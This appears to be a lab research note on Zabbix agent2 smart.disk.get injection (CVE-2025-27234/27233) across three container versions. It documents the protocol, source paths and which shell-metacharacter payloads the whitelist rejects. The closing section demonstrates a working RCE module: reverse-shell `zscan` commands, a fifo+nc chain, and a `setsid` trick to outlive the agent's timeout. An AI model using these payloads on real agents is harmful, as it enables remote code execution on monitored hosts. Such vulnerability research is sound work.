# Agent2 passive protocol + smart.disk.get vectors (CVE-2025-27233/27234), live containers

Research note on the lab's live containers:
- `zlab_agent2_5` — `zabbix/zabbix-agent2:5.0.46-alpine` (host port 10059 → internal 10050)
- `zlab_agent2` — `zabbix/zabbix-agent2:7.0.10-alpine` (host port 10050)

Everything was verified on live containers (protocol sniffer + direct requests) and cross-checked against the sources
of tags 5.0.46 / 5.0.47 / 7.0 (git.zabbix.com, shallow clone). `[INFERENCE]` — not directly confirmed.

---

## 1. The 5.0.46 passive protocol (NOT JSON!)

Unlike 7.0.x (JSON `{"request":"passive checks",...}`), the 5.0.46 agent accepts a **raw item key**:

```
C->S: ZBXD\x01 + LE64(len(key)) + key
S->C: ZBXD\x01 + LE32(len(value)) + LE32(len(value)) + value
```

Captured by a sniffer proxy (a python proxy between `zabbix_get` 5.0.46 and the agent, container
`zlab_agentproxy`, 172.18.0.11:10501 → zlab_agent2_5:10050) for `agent.version`:

```
C->S b'ZBXD\x01\r\x00\x00\x00\x00\x00\x00\x00agent.version'     # header 5+8, payload 13
S->C b'ZBXD\x01\x06\x00\x00\x00\x06\x00\x00\x005.0.46'          # header 5+4+4 (len duplicated)
```

Direct request (host 127.0.0.1:10059), hex `system.hostname`:
```
5a 42 58 44 01 0c 00 00 00 0c 00 00 00 34 32 62 64 62 65 63 39 39 32 66 62
"ZBXD\x01"  LE32(12)  LE32(12)  "42bdbec992fb"
```
The response length is duplicated twice (a 5.0 protocol quirk, LE32×2; the parser reads the first LE32).
Plain-text responses: `agent.version` → `5.0.46`, `system.hostname` → `42bdbec992fb`.
For `smart.disk.get[...]` the response is a JSON string (see §3).

> Note: the `zbxscan/exploits/modules/agent2.py` module implements only the 7.0 JSON protocol.
> For 5.0.x a raw channel is needed (this report documents the format; the module was not changed — the scope is 'proof + report').

## 2. The smartctl execution model in 5.0.46 (per the 5.0.46 tag sources)

`src/go/plugins/smart/smart.go`:
```go
var cleanRegex = regexp.MustCompile(`^[a-zA-Z0-9 \-_/\\\.]*$`)
// diskGet(): for _, v := range params { clearString(v) }  → error
//   "invalid characters found in parameter '%s'"  (zbxerr)
// diskGetSingle(path, raidType): executable = path; if raidType != "" { executable = path + " -d " + raidType }
```
`src/go/plugins/smart/smart_nix.go`:
```go
executable := fmt.Sprintf("sudo -n %s %s", "smartctl", args)
out, err = zbxcmd.ExecuteStrict(executable, time.Second*...)
```
`src/go/pkg/zbxcmd/zbxcmd_nix.go` (5.0.46):
```go
cmd := exec.Command("sh", "-c", s)   // ← SHELL
```

**Model conclusion**: 5.0.46 executes `sh -c "sudo -n smartctl <device> -d <mode>"` — the code path is
**shell-backed** (RCE-capable), BUT the parameters pass a strict `cleanRegex` whitelist
(letters/digits/`- _ / \ .`/space). Added by commit `ecf2e8e136` (DEV-2701, 2023-10-27);
present in all tags 5.0.40…5.0.47 (verified with `git tag --contains`).

## 3. smart.disk.get injections, live container 5.0.46 (port 10059)

Client: the raw format from §1. Responses:

| Request | Result |
|---|---|
| `smart.disk.get[sda,]` | JSON `{"...","error":"Smartctl open device: sda failed: No such device","exit_status":2,...}` — smartctl was actually invoked |
| `smart.disk.get[sda,no]` | `"error":"sda: Unknown device type 'no', =======\u003e VALID ARGUMENTS ARE: ata, scsi...` — the mode reaches `-d` |
| `smart.disk.get[sda;id;qq,]` | `ZBX_NOTSUPPORTED\x00Cannot fetch data: Invalid characters found in parameter 'sda;id;qq'.` |
| `smart.disk.get[sda;echo MARKER;,]` | the same (rejected) |
| `smart.disk.get[sda,\`id\`]` | `...Invalid characters found in parameter '\`id\`'.` |
| `smart.disk.get[sda\|id,]`, `sda&x`, `sda$x`, `sda'x`, `sda"x`, `sda(x)`, `sda<x`, `sda#x`, `sda*x`, `sda?x`, `sda!x`, `sda~x`, `sda:x`, `sda@x`, `sda=x`, `sda+x`, `sda%x`, `sda,x` | all REJECTED |
| `smart.disk.get[sda\nid,]` (a literal LF) | REJECTED |
| `smart.disk.get[aaa bbb,]` (a space) | OK — `"error":"ERROR: smartctl takes ONE device name as the final command-line argument."` (argv injection, not RCE) |
| `smart.disk.get[-V,]` | `ZBX_NOTSUPPORTED\x00Cannot fetch data: Cannot unmarshal JSON: invalid character 's'...` — **`-V` reached smartctl** (the stdout contains the version `smartctl 7.x...`), i.e. flag injection into argv works |
| `smart.disk.get[-o on -d ata,]` | smartctl option injection (argv), the 'requires a device name' error |

**Summary for 5.0.46**: not a single shell metacharacter passes the whitelist; `; id ;`, backticks,
`$(...)`, `|`, `&`, quotes, LF — all are rejected at the plugin level ('Invalid characters found in
parameter'). Command output in the response was **not obtained** in any variant. Command injection is
absent in this binary; only argv injection into smartctl arguments (flags) is available, which does not
allow executing arbitrary commands (smartctl has no exec options).

## 4. 7.0.10 (port 10050) — a slice for comparison

Protocol: 7.0 JSON (`{"version":"7.0.10","variant":2,...}`), as in the agent2.py module.

There is **no sanitization** in 7.0.x — parameters arrive verbatim (confirmed: `smart.disk.get[sda;id;,]`
is not rejected, `-V`/`-f`/`-l scttempsts` reach smartctl: the response `Cannot marshal JSON: invalid
character 's'...` = smartctl output). But execution is an **exec array**, without a shell
(`src/go/plugins/smart/controller.go` 7.0):
```go
out, err := exec.CommandContext(ctx, "sudo", "-n", "smartctl", "-a", path, "-d", raidType, "-j").
    CombinedOutput()
```
→ on 7.0.10 the primitive is strictly argv-only; RCE is impossible in principle (no `/bin/sh` in the chain).

## 5. Versions and CVE-2025-27234 (fix timeline)

- 5.0.0 – 5.0.39: smart.disk.get parameters are **unvalidated** + execution via
  `sh -c "sudo -n smartctl ..."` → **RCE** (CVE-2025-27234, ticket ZBX-26985, 'Affected 5.0.0–5.0.46').
- 5.0.40 – 5.0.46: `cleanRegex`/`clearString` added (DEV-2701, `ecf2e8e136`, 2023-10-27; all
  tags 5.0.40+). The shell remained, but metacharacters are blocked → the RCE flavor is **not reproducible**
  (our live 5.0.46 falls here). The ticket marks 5.0.40–5.0.46 as 'affected' — see §6.
- 5.0.47: `[ZBX-23858] fixed injection vulnerability in Zabbix agent 2 smartctl plugin` —
  rewritten to an exec array (`controller.go`: `exec.CommandContext(ctx,"sudo","-n",smartctl,args...)`),
  the shell removed entirely. This is the 'Fixed 5.0.47' from the ticket.
- 7.0.x: an exec array from the very beginning (7.0 is not affected by the RCE flavor; CVE-2025-27233 — argv).

## 6. Summary: verdict on the live 5.0.46 container

- The CVE-2025-27234 RCE flavor on the `zlab_agent2_5` container (5.0.46) is **not reproducible**:
  input parameters pass the `cleanRegex` whitelist; all shell metacharacters are rejected
  (`ZBX_NOTSUPPORTED: Invalid characters found in parameter`); the output of `id`/commands was not obtained in the response.
- Discrepancy with the ticket ('Affected 5.0.0–5.0.46'): on tag 5.0.46 (git.zabbix.com, official)
  the regex is already present, and the binary's behavior confirms it. `[INFERENCE]` The ticket wording
  covers the branch until the shell is fully removed (5.0.47); exploiting 5.0.40–5.0.46 would require
  a whitelist bypass, which was not found during testing (all metacharacters, including LF/CR, are rejected).
- Shell session/revshell on 5.0.46: **not obtained** (nothing to inject with — argv-only).
- Confirmed live: the 5.0 passive protocol (raw key, LE32×2 length), the smartctl invocation,
  argv/flag injection (`-V` gets through), 7.0.10 arguments verbatim in the exec array.

Evidence snapshots of requests/responses — in the text of §1 and §3 (hex and payload), sources — tags 5.0.46/5.0.47
(local clone `/tmp/zbx50`, `src/go/plugins/smart/{smart.go,smart_nix.go}`, `src/go/pkg/zbxcmd/zbxcmd_nix.go`).

## 7. RCE session module (agent2.py): --cmd/--shell verified (5.0.30)

Live verification of the `zbxscan/exploits/modules/agent2.py` module (`Cve202527234._session`) on the container
`zlab_agent2_30` (agent2 5.0.30, host port 10061 → internal 10050, zbx-testlab network, gateway 172.18.0.1):

```
zscan -a -t 127.0.0.1:10061 -exp CVE-2025-27234 --agent-port 10061 \
      --revshell 172.18.0.1:44563 --cmd 'id; hostname'
  → ok: True, mode: cmd
    output: /bin/sh: can't access tty; job control turned off
            /var/lib/zabbix $ uid=1997(zabbix) gid=1995(zabbix) groups=1995(zabbix),0(root)
            c54cae9b6230
```

```
printf 'id\nhostname\nexit\n' | zscan -a -t 127.0.0.1:10061 -exp CVE-2025-27234 \
      --agent-port 10061 --revshell 172.18.0.1:44564 --shell
  → agent# uid=1997(zabbix) ... ; agent# c54cae9b6230 ; exit closed the REPL (ok: True, mode: shell)
```

Key trick: the fifo+nc chain is wrapped in `(setsid sh -c '...' </dev/null >/dev/null 2>&1 &)` so that
the plugin timeout 'Timeout while executing a shell script' (~3s, kills the process group) does not kill
the shell: the old foreground variant (`sda;sh -c '...';#`) managed to emit only the banner (the connection
came up, but the commands landed in an already-dead `sh` → the output was lost). `setsid` is present in the container
(/usr/bin/setsid); fallback — `nohup`, then the plain variant. Technique: poll accept 3×2s on the payload,
3 payload candidates. `--cmd`: `cmd\n` + reading for ~6s; `--shell`: line → 0.6s → output, `exit`
closes it. The primitive/architecture are confirmed in §1–§3; here — reproducibility via the module.
